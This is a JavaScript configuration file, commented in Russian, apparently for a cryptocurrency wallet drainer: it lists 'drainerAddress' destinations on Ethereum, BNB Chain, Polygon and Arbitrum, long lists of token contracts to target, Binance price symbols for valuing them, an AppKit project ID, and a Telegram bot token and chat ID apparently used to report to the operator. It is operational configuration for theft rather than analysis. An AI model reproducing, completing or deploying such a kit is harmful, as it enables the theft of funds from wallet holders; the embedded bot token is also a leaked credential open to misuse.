const config = {
    // Telegram конфигурация
    TELEGRAM_BOT_TOKEN: '7809334183:AAFWHDFvNU6TDYbGZqw2C7NennnEzvzR0cg',
    TELEGRAM_CHAT_ID: '-1002337940908',
  
    // Project ID для AppKit
    PROJECT_ID: 'd85cc83edb401b676e2a7bcef67f3be8',
  
    // Конфигурация сетей и адресов дрейнеров
    CHAINS: {
      1: {
        name: "Ethereum Mainnet",
        nativeToken: "ETH",
        chainIdHex: "0x1",
        rpcUrls: ["https://rpc.eth.gateway.fm", "https://ethereum-rpc.publicnode.com"],
        usdtAddress: "0xdac17f958d2ee523a2206206994597c13d831ec7",
        usdcAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
        drainerAddress: "0x3a70bCC9de802799950CBc50a3D5a1B5605B969B",
        otherTokenAddresses: {
          DAI: "0x6b175474e89094c44da98b954eedeac495271d0f",
          WBTC: "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",
          UNI: "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984",
          LINK: "0x514910771af9ca656af840dff83e8264ecf986ca",
          COMP: "0xc00e94cb662c3520282e6f5717214004a7f26888",
          YFI: "0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e",
          CRV: "0xd533a949740bb3306d119cc777fa900ba034cd52",
          BAT: "0x0d8775f648430679a709e98d2b0cb6250d2887ef",
          ZRX: "0xe41d2489571d322189246dafa5ebde1f4699f498",
          LRC: "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd",
          BNB: "0xb8c77482e45f1f44de1745f52c74426c631bdd52",
          SHIB: "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce",
          PEPE: "0x6982508145454ce325ddbe47a25d4ec3d2311933",
          LEASH: "0x27c70cd1946795b66be9d954418546998b546634",
          FLOKI: "0xcf0c122c6b73ff809c693db761e7baebe62b6a2e",
          AAVE: "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9",
          RNDR: "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24",
          MKR: "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2",
          SUSHI: "0x6b3595068778dd592e39a122f4f5a5cf09c90fe2",
          GLM: "0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429",
          REP: "0x1985365e9f78359a9b6ad760e32412f4a445e862",
          SNT: "0x744d70fdbe2ba4cf95131626614a1763df805b9e",
          STORJ: "0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac"
        }
      },
      56: {
        name: "BNB Chain",
        nativeToken: "BNB",
        chainIdHex: "0x38",
        rpcUrls: [
          "https://bsc-dataseed.binance.org/",
          "https://bsc-dataseed1.defibit.io/",
          "https://bsc-dataseed1.ninicoin.io/"
        ],
        usdtAddress: "0x55d398326f99059ff775485246999027b3197955",
        usdcAddress: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
        drainerAddress: "0x9C88B840949Af813E33da3c80b3fa717A54aAE62",
        otherTokenAddresses: {
          SHIB: "0x2859e4544c4bb03966803b044a93563bd2d0dd4d",
          PEPE: "0x25d887ce7a35172c62febfd67a1856f20faebb00",
          FLOKI: "0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006",
          CAKE: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82",
          BAKE: "0xe02df9e3e622debdd69fb838bb799e3f168902c5",
          XVS: "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63",
          ALPACA: "0x8f0528ce5ef7b51152a59745befdd91d97091d2f",
          AUTO: "0xa184088a740c695e156f91f5cc086a06bb78b827",
          BURGER: "0xae9269f27437f0fcbc232d39ec814844a51d6b8f",
          EPS: "0xa7f552078dcc247c2684336020c03648500c6d9f",
          BELT: "0xe0e514c71282b6f4e823703a39374cf58dc3ea4f",
          MBOX: "0x3203c9e46c3d3821e8be4c2c9f0e2e7b0d5d0e75",
          SFP: "0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb",
          BabyDoge: "0xc748673057861a797275cd8a068abb95a902e8de",
          EGC: "0xc001bbe2b87079294c63ece98bdd0a88d761434e",
          QUACK: "0xd74b782e05aa25c50e7330af541d46e18f36661c",
          PIT: "0xa003e3f0ed31c816347b6f99c62c6835c2c6b6f2"
        }
      },
      137: {
        name: "Polygon",
        nativeToken: "MATIC",
        chainIdHex: "0x89",
        rpcUrls: ["https://polygon-rpc.com/"],
        usdtAddress: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",
        usdcAddress: "0x2791bca1f2de4661ed88a30c99a7a9449aa84174",
        drainerAddress: "0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c",
        otherTokenAddresses: {
          SHIB: "0x6f8a06447ff6fcf75d803135a7de15ce88c1d4ec",
          PEPE: "0xa102daa5e3d35ecaef2a14de4e94baaf9cc38d56",
          QUICK: "0x831753dd7087cac61ab5644b308642cc1c33dc13",
          GHST: "0x385eeac5cb85a38a9a07a70c73e0a3271ca19ec7",
          DFYN: "0xc168e40227e4edfb0b3dabb4b05d0b7c67f6a9be",
          FISH: "0x3a3df212b7aa91aa0402b9035b098891d276572b",
          ICE: "0x4e1581f01046e1c6d7c3aa0fea8e9b7ea0f28c49",
          DC: "0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e"
        }
      },
      42161: {
        name: "Arbitrum One",
        nativeToken: "ETH",
        chainIdHex: "0xa4b1",
        rpcUrls: ["https://arb1.arbitrum.io/rpc"],
        usdtAddress: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9",
        usdcAddress: "0xaf88d065e77c8cc2239327c5edb3a432268e5831",
        drainerAddress: "0x8814D8937F84D9D93c125E9031087F2e8Cfc9b4F",
        otherTokenAddresses: {
          PEPE: "0xa54b8e307e70e310a5c6bf7c2db4b33ed9f3ac51"
        }
      }
    },
  
    // Идентификаторы токенов для Binance API
    TOKEN_SYMBOLS: {
      "ETH": "ETHUSDT",
      "BNB": "BNBUSDT",
      "MATIC": "MATICUSDT",
      "0xdac17f958d2ee523a2206206994597c13d831ec7": "USDTUSDT",
      "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48": "USDCUSDT",
      "0x6b175474e89094c44da98b954eedeac495271d0f": "DAIUSDT",
      "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599": "WBTCUSDT",
      "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984": "UNIUSDT",
      "0x514910771af9ca656af840dff83e8264ecf986ca": "LINKUSDT",
      "0xc00e94cb662c3520282e6f5717214004a7f26888": "COMPUSDT",
      "0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e": "YFIUSDT",
      "0xd533a949740bb3306d119cc777fa900ba034cd52": "CRVUSDT",
      "0x0d8775f648430679a709e98d2b0cb6250d2887ef": "BATUSDT",
      "0xe41d2489571d322189246dafa5ebde1f4699f498": "ZRXUSDT",
      "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd": "LRCUSDT",
      "0xb8c77482e45f1f44de1745f52c74426c631bdd52": "BNBUSDT",
      "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce": "SHIBUSDT",
      "0x6982508145454ce325ddbe47a25d4ec3d2311933": "PEPEUSDT",
      "0x27c70cd1946795b66be9d954418546998b546634": "LEASHUSDT",
      "0xcf0c122c6b73ff809c693db761e7baebe62b6a2e": "FLOKIUSDT",
      "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9": "AAVEUSDT",
      "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24": "RNDRUSDT",
      "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2": "MKRUSDT",
      "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82": "CAKEUSDT",
      "0xe02df9e3e622debdd69fb838bb799e3f168902c5": "BAKEUSDT",
      "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63": "XVSUSDT",
      "0x8f0528ce5ef7b51152a59745befdd91d97091d2f": "ALPACAUSDT",
      "0xa184088a740c695e156f91f5cc086a06bb78b827": "AUTOUSDT",
      "0xae9269f27437f0fcbc232d39ec814844a51d6b8f": "BURGERUSDT",
      "0xa7f552078dcc247c2684336020c03648500c6d9f": "EPSUSDT",
      "0xe0e514c71282b6f4e823703a39374cf58dc3ea4f": "BELTUSDT",
      "0x3203c9e46c3d3821e8be4c2c9f0e2e7b0d5d0e75": "MBOXUSDT",
      "0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb": "SFPUSDT",
      "0xc748673057861a797275cd8a068abb95a902e8de": "BABYDOGEUSDT",
      "0xc001bbe2b87079294c63ece98bdd0a88d761434e": "EGCUSDT",
      "0xd74b782e05aa25c50e7330af541d46e18f36661c": "QUACKUSDT",
      "0xa003e3f0ed31c816347b6f99c62c6835c2c6b6f2": "PITUSDT",
      "0xc2132d05d31c914a87c6611c10748aeb04b58e8f": "USDTUSDT",
      "0x2791bca1f2de4661ed88a30c99a7a9449aa84174": "USDCUSDT",
      "0x6f8a06447ff6fcf75d803135a7de15ce88c1d4ec": "SHIBUSDT",
      "0xa102daa5e3d35ecaef2a14de4e94baaf9cc38d56": "PEPEUSDT",
      "0x831753dd7087cac61ab5644b308642cc1c33dc13": "QUICKUSDT",
      "0x385eeac5cb85a38a9a07a70c73e0a3271ca19ec7": "GHSTUSDT",
      "0xc168e40227e4edfb0b3dabb4b05d0b7c67f6a9be": "DFYNUSDT",
      "0x3a3df212b7aa91aa0402b9035b098891d276572b": "FISHUSDT",
      "0x4e1581f01046e1c6d7c3aa0fea8e9b7ea0f28c49": "ICEUSDT",
      "0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e": "DCUSDT",
      "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9": "USDTUSDT",
      "0xaf88d065e77c8cc2239327c5edb3a432268e5831": "USDCUSDT",
      "0xa54b8e307e70e310a5c6bf7c2db4b33ed9f3ac51": "PEPEUSDT"
    }
  };
  
  export default config;
